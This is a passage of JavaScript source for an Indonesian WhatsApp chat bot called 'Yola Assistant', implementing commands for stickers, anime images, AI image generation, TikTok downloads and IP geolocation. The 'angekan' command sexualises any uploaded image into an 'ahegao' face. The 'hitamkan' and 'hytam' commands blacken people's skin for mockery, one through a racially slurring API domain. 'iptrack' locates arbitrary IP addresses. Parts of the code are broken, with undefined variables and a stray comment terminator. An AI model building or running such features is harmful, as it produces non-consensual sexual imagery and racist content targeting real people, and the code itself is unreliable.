                    reply("────୨ Yola Assistant ৎ────\n⏳ Membuat quote chatnya... Sebentar yaa~");
                    const apiUrl = `${QC_API_URL}?text=${encodeURIComponent(q)}&name=${encodeURIComponent(pushname)}&profile=${encodeURIComponent(ppUrl)}`;
                    const response = await axios.get(apiUrl, {
                        responseType: 'arraybuffer'
                    });
                    if (response.status !== 200 || !response.data || response.data.byteLength < 1024) {
                        let errorDetail = `API Error (${response.status}).`;
                        try {
                            errorDetail = JSON.parse(response.data.toString()).message || errorDetail;
                        } catch {}
                        throw new Error(errorDetail);
                    }
                    const sticker = new Sticker(response.data, {
                        pack: `Yola Bot`,
                        author: `Lipp ❤️`,
                        type: "full",
                        categories: ["quote"],
                    });
                    await yola.sendMessage(m.chat, await sticker.toMessage(), {
                        quoted: m
                    });
                } catch (error) {
                    await reply(`────୨ Yola Assistant ৎ────\n❌ Hmph! Gagal bikin quote chatnya: ${error.message}\n────୨ Yola Assistant ৎ────`);
                }
            }
            break;
            case 'animegecg':
                await handleSimpleImageApi(yola, m, 'Ini dia, Genetic Cat Girl~ Meow!', 'https://nekos.life/api/v2/img/gecg', '➡️ Gecg Lagi Dong!', isOwner, isPremium, reply, defaultContextInfoBuilder(pushname, command));
                break;
            case 'animetickle':
                await handleSimpleImageApi(yola, m, 'Hihihi~ Geli-geli manjaa!', 'https://nekos.life/api/v2/img/tickle', '➡️ Tickle Lagi Dong!', isOwner, isPremium, reply, defaultContextInfoBuilder(pushname, command));
                break;
            case 'animefoxgirl':
                await handleSimpleImageApi(yola, m, 'Kon Kon! Rubah imut dataang~', 'https://nekos.life/api/v2/img/fox_girl', '➡️ Foxgirl Lagi Dong!', isOwner, isPremium, reply, defaultContextInfoBuilder(pushname, command));
                break;
            case 'animenom':
                await handleSimpleImageApi(yola, m, 'Nyam nyam~ Enak deh!', 'https://nekos.life/api/v2/img/nom', '➡️ Nom Lagi Dong!', isOwner, isPremium, reply, defaultContextInfoBuilder(pushname, command));
                break;
            case 'animecuddle':
                await handleSimpleImageApi(yola, m, 'Peluk sini~ Hangat dan nyaman!', 'https://nekos.life/api/v2/img/cuddle', '➡️ Cuddle Lagi Dong!', isOwner, isPremium, reply, defaultContextInfoBuilder(pushname, command));
                break;
            case 'animeslap':
                await handleSimpleImageApi(yola, m, 'PLAK! Rasain tuh! >:(', 'https://nekos.life/api/v2/img/slap', '➡️ Slap Lagi Dong!', isOwner, isPremium, reply, defaultContextInfoBuilder(pushname, command));
                break;
            case 'animewaifu':
                await handleSimpleImageApi(yola, m, 'Ini waifu spesial buat kamu~', 'https://nekos.life/api/v2/img/waifu', '➡️ Waifu Lagi Dong!', isOwner, isPremium, reply, defaultContextInfoBuilder(pushname, command));
                break;
            case 'txt2img':
            case 't2img': {
                const TXT2IMG_API_URL = "https://api.nekorinn.my.id/ai-img/imagen";
                if (!text) return reply(`────୨ Yola Assistant ৎ────\n❓ Mau gambar apa, Kak ${pushname}? Kasih tau Yola dong!\n────୨ Yola Assistant ৎ────`);
                let thinkingMsgKey = null;
                try {
                    const thinkingMsg = await reply(`────୨ Yola Assistant ৎ────\n🎨 Oke! Yola coba gambarin: *"${text}"*... Tunggu sebentar yaa!\n────୨ Yola Assistant ৎ────`);
                    thinkingMsgKey = thinkingMsg.key;
                    await yola.sendMessage(m.chat, {
                        react: {
                            text: "🎨",
                            key: m.key
                        }
                    });
                    await sleep(1000);
                    const response = await axios.get(TXT2IMG_API_URL, {
                        params: {
                            text: text
                        },
                        responseType: 'arraybuffer'
                    });
                    if (response.status === 200 && response.data && response.headers['content-type']?.startsWith('image')) {
                        if (thinkingMsgKey) {
                            await yola.sendMessage(m.chat, {
                                delete: thinkingMsgKey
                            }).catch(e => {});
                        }
                        await yola.sendMessage(m.chat, {
                            image: response.data,
                            caption: `────୨ Yola Assistant ৎ────\n✨ Ini dia gambarnya: *"${text}"*! Gimana, suka gak? >_<\n────୨ Yola Assistant ৎ────`,
                            contextInfo: defaultContextInfoBuilder(pushname, command)
                        }, {
                            quoted: m
                        });
                        await yola.sendMessage(m.chat, {
                            react: {
                                text: "✅",
                                key: m.key
                            }
                        });
                    } else {
                        let errorReason = `API Error (${response.status}).`;
                        try {
                            errorReason = JSON.parse(response.data.toString()).message || errorReason;
                        } catch {}
                        throw new Error(errorReason);
                    }
                } catch (imgError) {
                    let errorMsg = `────୨ Yola Assistant ৎ────\n❌ Hmph! Gagal gambarin: "${text}".\nError: ${imgError.message}\n────୨ Yola Assistant ৎ────`;
                    if (thinkingMsgKey) {
                        try {
                            await yola.sendMessage(m.chat, {
                                text: errorMsg,
                                edit: thinkingMsgKey,
                                contextInfo: defaultContextInfoBuilder(pushname, command).externalAdReply
                            });
                        } catch {
                            reply(errorMsg);
                        }
                    }
                    await yola.sendMessage(m.chat, {
                        react: {
                            text: "❌",
                            key: m.key
                        }
                    });
                }
            }
            break;
            case 'angekan': {
                let q = m.quoted ? m.quoted : m;
                let mime = (q.msg || q)?.mimetype || "";
                let defaultPrompt = "Buatkan Karakter Yang Ada Di Gamabar Tersebut Agar Di Berikan wajah ahegao buat seperti menggoda";
                if (!mime || !/image\/(jpe?g|png)/.test(mime)) return m.reply(`────୨ Yola Assistant ৎ────\nKirim/reply gambar dengan caption *${prefix + command}*\n────୨ Yola Assistant ৎ────`);
                let promptText = text || defaultPrompt;
                m.reply("────୨ Yola Assistant ৎ────\nOtw Di Sange kan...\n────୨ Yola Assistant ৎ────");
                try {
                    let imgData = await q.download();
                    let genAI = new GoogleGenerativeAI(GEMINI_API_KEY);
                    const base64Image = imgData.toString("base64");
                    const contents = [{
                        text: promptText
                    }, {
                        inlineData: {
                            mimeType: mime,
                            data: base64Image
                        }
                    }];
                    const model = genAI.getGenerativeModel({
                        model: "gemini-2.0-flash-exp-image-generation",
                        generationConfig: {
                            responseModalities: ["Text", "Image"]
                        },
                    });
                    const response = await model.generateContent(contents);
                    let resultImage;
                    for (const part of response.response.candidates[0].content.parts) {
                        if (part.inlineData) {
                            const imageData = part.inlineData.data;
                            resultImage = Buffer.from(imageData, "base64");
                        }
                    }
                    if (resultImage) {
                        const tempPath = path.join(TMP_DIR, `gemini_${Date.now()}.png`);
                        fs.writeFileSync(tempPath, resultImage);
                        await yola.sendMessage(m.chat, {
                            image: {
                                url: tempPath
                            },
                            caption: `────୨ Yola Assistant ৎ────\n*Waifu Haram*\n────୨ Yola Assistant ৎ────`,
                            contextInfo: defaultContextInfoBuilder(pushname, command)
                        }, {
                            quoted: m
                        });
                        setTimeout(() => {
                            try {
                                fs.unlinkSync(tempPath);
                            } catch {}
                        }, 30000);
                    } else {
                        m.reply("────୨ Yola Assistant ৎ────\nGagal Di Sange Pahala Nya Ke gedean Ini Mah.\n────୨ Yola Assistant ৎ────");
                    }
                } catch (error) {
                    m.reply(`────୨ Yola Assistant ৎ────\nError: ${error.message}\n────୨ Yola Assistant ৎ────`);
                }
            }
            break;
            case 'hitamkan': {
                let qhytam = m.quoted ? m.quoted : m;
                let mimehytam = (qhytam.msg || qhytam)?.mimetype || '';
                if (!/image/.test(mimehytam)) return reply(`────୨ Yola Assistant ৎ────\nKirim/reply gambar dengan caption *${prefix + command}*\n────୨ Yola Assistant ৎ────`);
                let promptText = text || "Ubahlah Karakter Dari Gambar Tersebut Diubah Kulitnya Menjadi Hitam se hitam-hitam nya";
                m.reply("────୨ Yola Assistant ৎ────\nOtw Menghitam...\n────୨ Yola Assistant ৎ────");
                try {
                    let imgData = await qhytam.download();
                    let genAI = new GoogleGenerativeAI(GEMINI_API_KEY);
                    const base64Image = imgData.toString("base64");
                    const contents = [{
                        text: promptText
                    }, {
                        inlineData: {
                            mimeType: mimehytam,
                            data: base64Image
                        }
                    }];
                    const model = genAI.getGenerativeModel({
                        model: "gemini-2.0-flash-exp-image-generation",
                        generationConfig: {
                            responseModalities: ["Text", "Image"]
                        },
                    });
                    const response = await model.generateContent(contents);
                    let resultImage;
                    for (const part of response.response.candidates[0].content.parts) {
                        if (part.inlineData) {
                            const imageData = part.inlineData.data;
                            resultImage = Buffer.from(imageData, "base64");
                        }
                    }
                    if (resultImage) {
                        const tempPath = path.join(TMP_DIR, `gemini_${Date.now()}.png`);
                        fs.writeFileSync(tempPath, resultImage);
                        await yola.sendMessage(m.chat, {
                            image: {
                                url: tempPath
                            },
                            caption: `────୨ Yola Assistant ৎ────\n*berhasil menghitamkan*\n────୨ Yola Assistant ৎ────`,
                            contextInfo: defaultContextInfoBuilder(pushname, command)
                        }, {
                            quoted: m
                        });
                        setTimeout(() => {
                            try {
                                fs.unlinkSync(tempPath);
                            } catch {}
                        }, 30000);
                    } else {
                        m.reply("────୨ Yola Assistant ৎ────\nGagal Menghitamkan.\n────୨ Yola Assistant ৎ────");
                    }
                } catch (error) {
                    m.reply(`────୨ Yola Assistant ৎ────\nError: ${error.message}\n────୨ Yola Assistant ৎ────`);
                }
            }
            break;
            case 'aiimg':
            case 'geminiimg': {
                let q = m.quoted ? m.quoted : m;
                let mime = (q.msg || q)?.mimetype || "";
                let defaultPrompt = "Buatkan gambar baru berdasarkan gambar ini, pertahankan gaya dan objek utama. Jika ada teks tambahan, modifikasi sesuai teks tersebut.";
                if (!mime || !/image\/(jpe?g|png)/.test(mime)) return m.reply(`────୨ Yola Assistant ৎ────\nKirim/reply gambar dengan caption *${prefix + command}* [prompt opsional]\n────୨ Yola Assistant ৎ────`);
                let promptText = text || defaultPrompt;
                m.reply("────୨ Yola Assistant ৎ────\nOtw Diproses...\n────୨ Yola Assistant ৎ────");
                try {
                    let imgData = await q.download();
                    let genAI = new GoogleGenerativeAI(GEMINI_API_KEY);
                    const base64Image = imgData.toString("base64");
                    const contents = [{
                        text: promptText
                    }, {
                        inlineData: {
                            mimeType: mime,
                            data: base64Image
                        }
                    }];
                    const model = genAI.getGenerativeModel({
                        model: "gemini-2.0-flash-exp-image-generation",
                        generationConfig: {
                            responseModalities: ["Text", "Image"]
                        },
                    });
                    const response = await model.generateContent(contents);
                    let resultImage;
                    for (const part of response.response.candidates[0].content.parts) {
                        if (part.inlineData) {
                            const imageData = part.inlineData.data;
                            resultImage = Buffer.from(imageData, "base64");
                        }
                    }
                    if (resultImage) {
                        const tempPath = path.join(TMP_DIR, `gemini_${Date.now()}.png`);
                        fs.writeFileSync(tempPath, resultImage);
                        await yola.sendMessage(m.chat, {
                            image: {
                                url: tempPath
                            },
                            caption: `────୨ Yola Assistant ৎ────\n✨ Hasil gambar AI dari Yola! ✨\n────୨ Yola Assistant ৎ────`,
                            contextInfo: defaultContextInfoBuilder(pushname, command)
                        }, {
                            quoted: m
                        });
                        setTimeout(() => {
                            try {
                                fs.unlinkSync(tempPath);
                            } catch {}
                        }, 30000);
                    } else {
                        m.reply("────୨ Yola Assistant ৎ────\n❌ Hmph! Yola gagal bikin gambarnya.\n────୨ Yola Assistant ৎ────");
                    }
                } catch (error) {
                    m.reply(`────୨ Yola Assistant ৎ────\nError: ${error.message}\n────୨ Yola Assistant ৎ────`);
                }
            }
            break;
            case 'tiktok':
            case 'tt': {
                try {
                    if (!q) return m.reply(`────୨ Yola Assistant ৎ────\nContoh: ${prefix + command} linknya\n────୨ Yola Assistant ৎ────`)
                    if (!q.includes('tiktok.com')) return m.reply('────୨ Yola Assistant ৎ────\nHarus berupa link tiktok!\n────୨ Yola Assistant ৎ────')
                    yola.sendMessage(m.chat, {
                        react: {
                            text: "🔎",
                            key: m.key
                        }
                    })

                    const res = await axios.get(`https://vapis.my.id/api/ttdl?url=${encodeURIComponent(q)}`)

                    if (res.data?.status && res.data?.data?.status && res.data?.data?.data) {
                        const ress = res.data.data.data
                        const metadata = res.data.data?.metadata || {};

                        let caption = `────୨ Yola Assistant ৎ────\n✨ TikTok Download by Yola ✨\n`;
                        if (metadata.title) caption += `\n📄 Judul: ${metadata.title}\n`;
                        if (metadata.author?.nickname) caption += `\n👤 Oleh: @${metadata.author.nickname}\n`;

                        const no_wm_hd = ress.find(item => item.type === 'nowatermark_hd')
                        const no_wm = ress.find(item => item.type === 'nowatermark')
                        const img = ress.filter(item => item.type === 'photo')

                        let isGroup = m.chat.endsWith('@g.us');

                        if (no_wm_hd || no_wm) {
                            let messagePayload = {
                                footer: "Yola Asisten TikTok DL",
                                contextInfo: defaultContextInfoBuilder(pushname, command)
                            };

                            if (currentMenuStyle === 'V1') {
                                messagePayload.buttons = [{
                                    buttonId: `tiktok_thanks_yolaa_${m.key.id}`,
                                    buttonText: {
                                        displayText: "Good Yolaa >_<"
                                    },
                                    type: 1
                                }];
                                messagePayload.headerType = 4;
                            } else {
                                messagePayload.caption += `\n\nFooter: Yola Asisten TikTok DL`;
                            }

                            messagePayload.video = {
                                url: no_wm_hd ? no_wm_hd.url : no_wm.url
                            };
                            messagePayload.caption = caption + `\n✅ Video (Tanpa Watermark${no_wm_hd ? ' HD' : ''})\n────୨ Yola Assistant ৎ────`;

                            if (isGroup) {
                                await yola.sendMessage(m.sender, messagePayload, {});
                                await yola.sendMessage(m.chat, { text: `────୨ Yola Assistant ৎ────\nVideo sudah Yola kirimkan lewat chat pribadi, silahkan cek chat Yola ya. 😊\n────୨ Yola Assistant ৎ────` }, { quoted: m });
                            } else {
                                await yola.sendMessage(m.chat, messagePayload, { quoted: m });
                            }
                            return;

                        } else if (img.length > 0) {
                            await reply(`────୨ Yola Assistant ৎ────\n${caption}📸 Mengirim ${img.length} slide... Sebentar yaa~\n────୨ Yola Assistant ৎ────`)

                            for (const photo of img) {
                                let photoPayload = {
                                    image: {
                                        url: photo.url
                                    },
                                    footer: "Yola Asisten TikTok DL",
                                    contextInfo: defaultContextInfoBuilder(pushname, command)
                                };
                                if (currentMenuStyle === 'V1') {
                                    photoPayload.buttons = [{
                                        buttonId: `tiktok_thanks_yolaa_photo_${m.key.id}`,
                                        buttonText: {
                                            displayText: "Good Yolaa >_<"
                                        },
                                        type: 1
                                    }];
                                    photoPayload.headerType = 4;
                                } else {
                                    photoPayload.caption += `\n\nFooter: Yola Asisten TikTok DL`;
                                }
                                await yola.sendMessage(m.sender, photoPayload, {});
                                await sleep(500);
                            }

                            if (isGroup) {
                                await yola.sendMessage(m.chat, { text: `────୨ Yola Assistant ৎ────\nGambar sudah Yola kirimkan lewat chat pribadi, silahkan cek chat Yola ya. 😊\n────୨ Yola Assistant ৎ────` }, { quoted: m });
                            }
                            return;
                        } else {
                            m.reply('────୨ Yola Assistant ৎ────\nHmph! Yola gak nemu video atau gambar yang bisa diunduh dari link ini.\n────୨ Yola Assistant ৎ────');
                        }
                    } else {
                        m.reply('────୨ Yola Assistant ৎ────\nAduh, Yola gagal ngertiin respons dari API-nya atau gak ada data yang ketemu.\n────୨ Yola Assistant ৎ────');
                    }
                } catch (err) {
                    if (err.response) {
                        reply(`────୨ Yola Assistant ৎ────\n❌ Gagal unduh TikTok: API Error ${err.response.status}\n────୨ Yola Assistant ৎ────`);
                    } else {
                        reply('────୨ Yola Assistant ৎ────\n❌ Uh oh! Ada kesalahan pas Yola coba unduh video TikToknya.\n────୨ Yola Assistant ৎ────');
                    }
                }
            }
            break;

            case 'balogo': {
                const BALOGO_API_URL = "https://api.nekorinn.my.id/maker/ba-logo";
                if (args.length < 2) return reply(`────୨ Yola Assistant ৎ────\nContohnya gini loh: ${prefix + command} Yola Imut\n────୨ Yola Assistant ৎ────`);
                const textL = args[0];
                const textR = args[1];
                reply(`────୨ Yola Assistant ৎ────\n🎨 Oke! Yola bikinin BA Logo-nya... Sebentar yaa!\n────୨ Yola Assistant ৎ────`);
                try {
                    const apiUrl = `https://api.nekorinn.my.id/maker/ba-logo?textL=${encodeURIComponent(textL)}&textR=${encodeURIComponent(textR)}`;
                    const response = await axios.get(apiUrl, {
                        responseType: 'arraybuffer'
                    });
                    if (response.status === 200 && response.headers['content-type']?.startsWith('image')) {
                        await yola.sendMessage(m.chat, {
                            image: response.data,
                            caption: `────୨ Yola Assistant ৎ────\n✨ Ini dia BA Logo-nya! Keren kan? >_<\n────୨ Yola Assistant ৎ────`,
                            contextInfo: defaultContextInfoBuilder(pushname, command)
                        }, {
                            quoted: m
                        });
                    } else {
                        let errorReason = `API Error (${response.status}).`;
                        try {
                            errorReason = JSON.parse(response.data.toString()).message || errorReason;
                        } catch {}
                        throw new Error(errorReason);
                    }
                } catch (error) {
                    await reply(`────୨ Yola Assistant ৎ────\n❌ Hmph! Gagal bikin BA Logo-nya: ${error.message}\n────୨ Yola Assistant ৎ────`);
                }
            }
            break;
            case 'hytam': {
                let qhytam = m.quoted ? m.quoted : m;
                let mimehytam = (qhytam.msg || qhytam)?.mimetype || '';
                if (!/image/.test(mimehytam)) return reply(`────୨ Yola Assistant ৎ────\nKirim/reply gambar dengan caption *${prefix + command}*\n────୨ Yola Assistant ৎ────`);

                let mediaMessageToDownload;
                if (m.quoted && /image/.test(mimehytam)) {
                    mediaMessageToDownload = m.quoted;
                } else if (m.message?.imageMessage) {
                    mediaMessageToDownload = m;
                } else {
                    return reply(`────୨ Yola Assistant ৎ────\nKirim/reply gambar dengan caption *${prefix + command}*\n────୨ Yola Assistant ৎ────`);
                }

                let mediaPathHytam = null;
                try {
                    reply("────୨ Yola Assistant ৎ────\n⏳ Yola proses gambarnya jadi hitam yaa... Sebentar!\n────୨ Yola Assistant ৎ────");
                    await yola.sendMessage(m.chat, {
                        react: {
                            text: "🎨",
                            key: m.key
                        }
                    });

                    mediaPathHytam = await yola.downloadAndSaveMediaMessage(mediaMessageToDownload.msg || mediaMessageToDownload);
                    if (!mediaPathHytam || !fs.existsSync(mediaPathHytam)) {
                        throw new Error("Gagal mengunduh media.");
                    }

                    const bufferHytam = fs.readFileSync(mediaPathHytam);
                    const base64ImageHytam = bufferHytam.toString("base64");

                    const responseHytam = await axios({
                        url: "https://negro.consulting/api/process-image",
                        method: "POST",
                        data: {
                            filter: "hitam",
                            imageData: `data:image/png;base64,${base64ImageHytam}`
                        }
                    });

                    if (!responseHytam.data || !responseHytam.data.processedImageUrl) {
                        throw new Error("API tidak mengembalikan URL gambar yang diproses.");
                    }

                    const resultBase64Hytam = responseHytam.data.processedImageUrl.replace(/^data:image\/\w+;base64,/, "");
                    const resultBufferHytam = Buffer.from(resultBase64Hytam, "base64");

                    await yola.sendMessage(m.chat, {
                        image: resultBufferHytam,
                        caption: `────୨ Yola Assistant ৎ────\nTaraa! Gambarnya udah jadi hitam! Keren kan? ✨\n────୨ Yola Assistant ৎ────`,
                        contextInfo: defaultContextInfoBuilder(pushname, command)
                    }, {
                        quoted: m
                    });

                    await yola.sendMessage(m.chat, {
                        react: {
                            text: "✅",
                            key: m.key
                        }
                    });

                } catch (errHytam) {
                    let errorMsgHytam = "────୨ Yola Assistant ৎ────\n❌ Hmph! Gagal bikin gambarnya jadi hitam.";
                    if (errHytam.response && errHytam.response.data && errHytam.response.data.error) {
                        errorMsgHytam += `\nAlasan API: ${errHytam.response.data.error}`;
                    } else if (errHytam.message) {
                        errorMsgHytam += `\nDetail: ${errHytam.message}`;
                    }
                    reply(`${errorMsgHytam}\n────୨ Yola Assistant ৎ────`);
                    await yola.sendMessage(m.chat, {
                        react: {
                            text: "❌",
                            key: m.key
                        }
                    });
                } finally {
                    if (mediaPathHytam && fs.existsSync(mediaPathHytam)) {
                        try {
                            fs.unlinkSync(mediaPathHytam);
                        } catch (unlinkErrHytam) {}
                    }
                }
            }
            break;
            case 'hd':
            case 'remini':
            case 'upscale': {
                let qhd = m.quoted ? m.quoted : m;
                let mimehd = (qhd.msg || qhd)?.mimetype || '';
                if (!mimehd || !mimehd.startsWith('image/')) return reply('────୨ Yola Assistant ৎ────\nKirim atau reply gambar aja yaa, Kak~\n────୨ Yola Assistant ৎ────');
                await reply('────୨ Yola Assistant ৎ────\n⏳ Oke! Yola coba bikin gambarnya jadi HD... Tunggu sebentar!\n────୨ Yola Assistant ৎ────');
                let tempFilePath = null;
                try {
                    let mediahd = await qhd.download();
                    let exthd = mimehd.split('/')[1];
                    tempFilePath = path.join(TMP_DIR, `temp_hd_input_${Date.now()}.${exthd}`);
                    fs.writeFileSync(tempFilePath, mediahd);

                    let uploadedUrlhd = await CatBox(tempFilePath);
                    
                    const apiUrlNekorinn = `https://api.nekorinn.my.id/tools/pxpic-upscale?imageUrl=${encodeURIComponent(uploadedUrlhd)}`;
                    const responseNekorinn = await axios.get(apiUrlNekorinn);

                    if (!responseNekorinn.data || responseNekorinn.data.status !== true || !responseNekorinn.data.result) {
                        throw new Error(responseNekorinn.data.message || 'API tidak mengembalikan URL gambar HD yang valid.');
                    }
                    
                    let finalUpscaleUrl = responseNekorinn.data.result;

                    await yola.sendMessage(m.chat, {
                        image: {
                            url: finalUpscaleUrl
                        },
                        caption: `────୨ Yola Assistant ৎ────\n✨ Taraa! Gambarnya udah jadi HD! Makin cling kan? >_<\n────୨ Yola Assistant ৎ────`,
                        contextInfo: defaultContextInfoBuilder(pushname, command)
                    }, {
                        quoted: m
                    });
                } catch (ehd) {
                    await reply(`────୨ Yola Assistant ৎ────\n❌ Hmph! Gagal bikin HD: ${ehd.message || ehd}\n────୨ Yola Assistant ৎ────`);
                } finally {
                    if (tempFilePath && fs.existsSync(tempFilePath)) {
                        fs.unlinkSync(tempFilePath);
                    }
                }
            }
            break;*/
            case 'iptrack':
            case 'trackip': {
                const IPTRACK_API_1 = "http://ip-api.com/json/";
                const IPTRACK_API_2 = "https://ipwho.is/";
                const IPTRACK_API_3 = "https://api.nekorinn.my.id/tools/ipwhois";
                if (!isPremium) return reply("────୨ Yola Assistant ৎ────\n🔒 Fitur ini khusus buat Kakak Premium atau Owner Yola aja~\n────୨ Yola Assistant ৎ────");
                if (!text) return reply(`────୨ Yola Assistant ৎ────\n*Alamat IP-nya mana, Kak?* Contoh: ${prefix + command} 8.8.8.8\n────୨ Yola Assistant ৎ────`);
                const ipAddress = text.trim();
                const ipRegex = /^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/;
                if (!ipRegex.test(ipAddress)) return reply(`────୨ Yola Assistant ৎ────\n*Format IP-nya salah deh, Kak.* Coba cek lagi yaa~\n────୨ Yola Assistant ৎ────`);
                await reply(`────୨ Yola Assistant ৎ────\n⏱️ Oke! Yola coba lacak IP: *${ipAddress}*... Sebentar yaa!\n────୨ Yola Assistant ৎ────`);
                try {
                    const [res1, res2, res3, hostLookup] = await Promise.allSettled([axios.get(`${IPTRACK_API_1}${ipAddress}`), axios.get(`${IPTRACK_API_2}${ipAddress}`), axios.get(`${IPTRACK_API_3}?ip=${ipAddress}`), dns.reverse(ipAddress).catch(() => null)]);
                    await reply(`────୨ Yola Assistant ৎ────\n🛰️ Yola lagi analisa datanya...\n────୨ Yola Assistant ৎ────`);
                    await reply(`────୨ Yola Assistant ৎ────\n📝 Yola lagi susun laporannya buat Kakak...\n────୨ Yola Assistant ৎ────`);
                    const info1 = (res1.status === 'fulfilled' && res1.value.data) ? res1.value.data : {};
                    const info2 = (res2.status === 'fulfilled' && res2.value.data) ? res2.value.data : {};
                    const info3 = (res3.status === 'fulfilled' && res3.value.data?.status && res3.value.data.result) ? res3.value.data.result : {};
                    const hostnames = hostLookup.status === 'fulfilled' && hostLookup.value ? hostLookup.value.join(', ') : 'N/A';
                    const na = 'N/A';
                    const getYesNo = (val) => (val === true ? '✅ Iyaa' : val === false ? '❌ Enggak' : na);
                    let resultText = `┌── ❀ ⌜ 赤い糸 ⌟ ❀ ──╮\n│✧ *Info Intel IP dari Yola: ${ipAddress}* 📊\n│✧\n│✧ *Lokasinya ada di:*\n│✧  • Benua: ${info3.continent || info2.continent || info1.continent || na}\n│✧  • Negara: ${info3.flag?.emoji || ''} ${info3.country || info2.country || info1.country || na} (${info3.country_code || info2.country_code || info1.countryCode || na})\n│✧  • Wilayah: ${info3.region || info2.region || info1.regionName || na}\n│✧  • Kota: ${info3.city || info2.city || info1.city || na}\n│✧  • Kode Pos: ${info3.postal || info2.postal || info1.zip || na}\n│✧  • Lat/Lon: ${info3.latitude || info2.latitude || info1.lat || na}, ${info3.longitude || info2.longitude || info1.lon || na}\n│✧\n│✧ *Zona Waktunya:*\n│✧  • ID: ${tz.id || tz1 || na}\n│✧  • Offset: ${tz.utc || na}\n│✧  • Waktu Sekarang: ${tz.current_time ? new Date(tz.current_time).toLocaleString('id-ID', {
                        timeZone: tz.id || undefined,
                        hour12: false
                    }) : na}\n│✧\n│✧ *Jaringannya Punya:*\n│✧  • ISP: ${conn.isp || conn1.isp || na}\n│✧  • Organisasi: ${conn.org || conn1.org || na}\n│✧  • ASN: ${conn.asn || conn1.as || na}\n│✧  • Hostname: ${hostnames}\n│✧\n│✧ *Status Keamanannya:*\n│✧  • Proxy: ${getYesNo(sec.is_proxy)} | VPN: ${getYesNo(sec.is_vpn)} | TOR: ${getYesNo(sec.is_tor)}\n│✧\n│✧ *Info Lainnya nih:*\n│✧  • Mata Uang: ${curr.name || na} (${curr.code || na})\n│✧  • Kode Telp: +${info3.calling_code || info2.calling_code || na}\n│✧  • Bahasa: ${langData.name || na}\n│✧\n│✧ ✅ *Yola udah selesai lacaknya!* Semoga infonya berguna yaa~\n╰── ❀ ⌜ 赤い糸 ⌟ ❀ ──╯`;
                    await yola.sendMessage(m.chat, {
                        text: `${resultText}`,
                        contextInfo: {
                            mentionedJid: [m.sender],
                            externalAdReply: defaultContextInfoBuilder(pushname, command).externalAdReply
                        },
                    }, {
                        quoted: m
                    });
                } catch (error) {
                    await reply(`────୨ Yola Assistant ৎ────\n❌ Hmph! Gagal lacak IP-nya: ${error.message}*\n────୨ Yola Assistant ৎ────`);
                }
            }
            break;
            case 'resethistory': {
                if (!isOwner) return reply('────୨ Yola Assistant ৎ────\n🔒 Hmph! Cuma Owner Yola yang boleh mereset riwayat chat.\n────୨ Yola Assistant ৎ────');
                if (!yolaChatHistories[m.chat]) return reply('────୨ Yola Assistant ৎ────\nℹ️ Riwayat chat AI untuk obrolan ini sudah kosong kok.\n────୨ Yola Assistant ৎ────');
                delete yolaChatHistories[m.chat];
                saveYolaChatHistories();
                reply('────୨ Yola Assistant ৎ────\n✅ Riwayat chat AI untuk obrolan ini berhasil Yola reset!\n────୨ Yola Assistant ৎ────');
            }
            break;

            case 'yolaai': {
                if (!isOwner) return reply('────୨ Yola Assistant ৎ────\n🔒 Hmph! Cuma Owner Yola yang boleh atur ini.\n────୨ Yola Assistant ৎ────');
                const action = args[0]?.toLowerCase();

                if (action === 'on') {
                    if (yolaAiConfig.enabled) return reply('────୨ Yola Assistant ৎ────\n✅ AI Yola sudah nyala kok, Owner.\n────୨ Yola Assistant ৎ────');
                    yolaAiConfig.enabled = true;
                    saveYolaAiConfig();
                    reply('────୨ Yola Assistant ৎ────\n✅ Oke! AI Yola sudah Yola aktifin! Siap membantu~ >_<\n────୨ Yola Assistant ৎ────');
                } else if (action === 'off') {
                    if (!yolaAiConfig.enabled) return reply('────୨ Yola Assistant ৎ────\n❌ AI Yola memang sudah nonaktif kok, Owner.\n────୨ Yola Assistant ৎ────');
                    yolaAiConfig.enabled = false;
                    saveYolaAiConfig();
                    reply('────୨ Yola Assistant ৎ────\n❌ Oke! AI Yola sudah Yola nonaktifin.\n────୨ Yola Assistant ৎ────');
                } else {
                    const statusText = yolaAiConfig.enabled ? '🟢 Aktif' : '🔴 Nonaktif';
                    reply(`────୨ Yola Assistant ৎ────\n✨ *Status AI Yola* ✨\nStatus saat ini: *${statusText}*\n\n💡 *Cara Mengatur:*\n  • Nyalakan: \`${prefix}yolaai on\`\n  • Matikan: \`${prefix}yolaai off\`\n────୨ Yola Assistant ৎ────`);
                }
            }
            break;

            case 'yolaa':
            case 'ai': {
                if (!yolaAiConfig.enabled && !isOwner) return reply('────୨ Yola Assistant ৎ────\nMaaf, AI Yola lagi istirahat nih... coba lagi nanti yaa~\n────୨ Yola Assistant ৎ────');
                if (!text && !m.quoted?.text && !m.message?.imageMessage && !m.quoted?.message?.imageMessage) return reply(`────୨ Yola Assistant ৎ────\n❓ Mau tanya apa sama Yola, Kak ${pushname}?\n────୨ Yola Assistant ৎ────`);

                const userRPGData = registeredUsers[m.sender];
                let imageForAI = null;
                let imageMimeForAI = null;
                let questionText = text;

                if (!questionText && m.quoted) {
                    const quotedMessage = m.quoted.message;
                    if (quotedMessage) {
                        if (quotedMessage.conversation) {
                            questionText = quotedMessage.conversation;
                        } else if (quotedMessage.extendedTextMessage?.text) {
                            questionText = quotedMessage.extendedTextMessage.text;
                        } else if (quotedMessage.imageMessage?.caption) {
                            questionText = quotedMessage.imageMessage.caption;
                        } else if (quotedMessage.videoMessage?.caption) {
                            questionText = quotedMessage.videoMessage.caption;
                        } else if (quotedMessage.documentMessage?.caption) {
                            questionText = quotedMessage.documentMessage.caption;
                        }
                    }
                }

                if (m.mtype === 'imageMessage' && m.message?.imageMessage) {
                    questionText = m.message.imageMessage.caption || questionText;
                    try {
                        imageForAI = await downloadMediaMessage(m, 'buffer', {});
                        imageMimeForAI = m.message.imageMessage.mimetype;
                    } catch (e) {
                        imageForAI = null;
                        imageMimeForAI = null;
                    }
                } else if (m.quoted?.mtype === 'imageMessage' && m.quoted?.message?.imageMessage) {
                    questionText = m.quoted.message.imageMessage.caption || questionText;
                    try {
                        imageForAI = await downloadMediaMessage(m.quoted, 'buffer', {});
                        imageMimeForAI = m.quoted.message.imageMessage.mimetype;
                    } catch (e) {
                        imageForAI = null;
                        imageMimeForAI = null;
                    }
                }
                
                if (!questionText && !imageForAI) {
                return;
            }

                if (!questionText && imageForAI) questionText = 'Jelaskan gambar ini?';


